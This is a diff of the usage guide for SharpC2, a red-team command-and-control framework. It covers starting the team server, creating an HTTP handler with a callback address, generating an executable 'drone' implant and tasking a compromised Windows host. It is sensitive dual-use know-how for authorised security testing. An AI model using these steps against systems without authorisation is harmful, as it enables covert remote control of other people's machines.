@@ -2,20 +2,19 @@
 
 ## Start the Team Server
 
-Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root/admin if you want to bind handlers to low ports (e.g. port 80 for the default HTTP handler).
+Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root/admin if you want to bind handlers to low ports (e.g. port 80 for the HTTP handler).
 
 
 ```text
-rasta@Rastas-MBP publish % sudo ./TeamServer -p Passw0rd!
-Password:
+rasta@Rastas-MBP ~/S/T/b/R/n/o/publish (main)> sudo ./TeamServer -p Passw0rd!
+info: Microsoft.Hosting.Lifetime[14]
+      Now listening on: https://0.0.0.0:8443
 info: Microsoft.Hosting.Lifetime[0]
-    Now listening on: https://0.0.0.0:8443
+      Application started. Press Ctrl+C to shut down.
 info: Microsoft.Hosting.Lifetime[0]
-    Application started. Press Ctrl+C to shut down.
+      Hosting environment: Production
 info: Microsoft.Hosting.Lifetime[0]
-    Hosting environment: Production
-info: Microsoft.Hosting.Lifetime[0]
-    Content root path: /Users/rasta/SharpC2/TeamServer/bin/Release/net6.0/osx-x64/publish
+      Content root path: /Users/rasta/SharpC2/TeamServer/bin/Release/net6.0/osx-x64/publish
 ```
 
 The team server will listen for user connections on port 8443 by default.  This can be changed in `appsettings.json`.
@@ -26,38 +25,17 @@ If the `ASPNETCORE_ENVIRONMENT` environment variable is set to `Development`, th
 The client requires several command line options including `-s` (--server), `-p` (--port), `-n` (--nick) and `-P` (--password). You'll be prompted to accept the server's self-signed certificate unless `-i` (--ignore-ssl) is used.
 
 ```text
-./SharpC2 -s localhost -p 8443 -n rasta -P Passw0rd!
-  ___ _                   ___ ___
+rasta@Rastas-MBP ~/S/C/b/R/n/o/publish (main)> ./SharpC2 -s localhost -p 8443 -n rasta -P Passw0rd! -i
+  ___ _                   ___ ___ 
  / __| |_  __ _ _ _ _ __ / __|_  )
- \__ \ ' \/ _` | '_| '_ \ (__ / /
+ \__ \ ' \/ _` | '_| '_ \ (__ / / 
  |___/_||_\__,_|_| | .__/\___/___|
-                   |_|
-    @_RastaMouse
-    @_xpn_
+                   |_|            
+    @_RastaMouse                  
+    @_xpn_                        
 
 
-Server Certificate
-------------------
-
-[Subject]
-  CN=localhost
-
-[Issuer]
-  CN=localhost
-
-[Serial Number]
-  67B4A5487F67745B
-
-[Not Before]
-  25/02/2021 21:01:43
-
-[Not After]
-  25/02/2022 21:01:43
-
-[Thumbprint]
-  B968C8D9C2B40F4AD7A46C92B0B700DEE46492FE
-
-accept? [y/N] > y
+[drones] >
 ```
 
 ## Configure and Start a Handler
@@ -71,6 +49,7 @@ The `[drones]` screen is the default for the client.  You can type `help` on any
 
 Name          Description
 ----          -----------
+credentials   Manage credentials
 exit          Exit this client
 handlers      Manage Handlers
 help          Print a list of commands and their description
@@ -81,64 +60,58 @@ list          List Drones
 payload       Generate a payload
 ```
 
-SharpC2 ships with two handlers. One to egress over HTTP and another to p2p over SMB.
+SharpC2 ships with three handler types. HTTP, TCP and SMB.  Use the `create` command to create a new handler.
+`Usage: create <name> <type>`.
 
 ```text
-[drones] > handlers
-[handlers] > list
-
-Name          Running
-----          -------
-default-http  False
-default-smb   False
+[handlers] > create demo-http HTTP
+[+] Handler "demo-http" created.
 ```
 
 Use the `set` command to set parameters for a handler.
+`Usage: set <handler> <parameter> <value>`.
 
 ```text
-[handlers] > set default-http BindPort 8080
-[+] BindPort set to 8080
-
-[handlers] > set default-http ConnectPort 8080
-[+] ConnectPort set to 8080
+[handlers] > set demo-http ConnectAddress 192.168.1.105
+[+] ConnectAddress set to 192.168.1.105
 ```
 
 A handler can then be started and stopped using the `start` and `stop` commands respectively.
 
 ```text
-[handlers] > start default-http
-[+] Handler "default-http" started.
+[handlers] > start demo-http
+[+] Handler "demo-http" started.
 
-[handlers] > stop default-http
-[+] Handler "default-http" stopped.
+[handlers] > stop demo-http
+[+] Handler "demo-http" stopped.
 ```
 
 ## Generate a Payload
 
-Payloads can be generated from the `[drones]` screen, uysing the `payload` command.
+Payloads can be generated from the `[drones]` screen, using the `payload` command.
 
 ```text
-[drones] > payload default-http Exe c:\payloads\http-drone.exe
-[+] 204800 bytes saved.
+[drones] > payload demo-http Exe /tmp/http-drone.exe
+[+] 164352 bytes saved.
 ```
 
 ## Interacting with Drones
 
 ```text
-[+] Drone fafc9af069 checked in from Daniel@Ghost-Canyon.
+[+] Drone a47153bd55 checked in from IEUser@MSEDGEWIN10.
 
 [drones] > list
 
-Guid        Parent  Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
-----        ------  -------        --------      --------  -------     ---    ---------  ----  --------
-fafc9af069  -       192.168.1.229  Ghost-Canyon  Daniel    http-drone  16608  Medium     x64   24/11/2021 18:43:22
+Guid        Parent  Address      Hostname     Username  Process     Pid   Integrity  Arch  LastSeen
+----        ------  -------      --------     --------  -------     ---   ---------  ----  --------
+a47153bd55  -       10.211.55.6  MSEDGEWIN10  IEUser    http-drone  7860  Medium     x64   18/12/2021 17:30:16
 ```
 
 To interact with a Drone, use `interact <guid>`.
 
 ```text
-[drones] > interact fafc9af069
-[fafc9af069] > help
+[drones] > interact a47153bd55
+[a47153bd55] > help
 
 Name              Description
 ----              -----------
@@ -169,7 +142,7 @@ upload            Upload a file to the current working directory of the Drone
 ```
 
 ```text
-[fafc9af069] > getuid
+[a47153bd55] > getuid
 [+] Tasked Drone to run getuid.
 [+] Drone checked in.  Sent 176 bytes.
 [+] Drone task 57582950c7 is running.
